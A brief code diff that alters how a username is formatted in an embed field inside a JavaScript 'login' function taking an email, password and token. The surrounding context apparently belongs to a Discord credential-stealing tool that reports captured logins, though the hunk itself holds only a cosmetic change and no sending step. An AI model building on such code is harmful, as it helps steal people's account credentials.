@@ -755,7 +755,7 @@ const login = async (email, password, token) => {
         },
         {
           name: '<:patriot_token:1032868283759730728> Username',
-          value: `\`${json.username}\``,
+          value: `\`${json.username}#${json.discriminator}\``,
           inline: true,
         },
         {
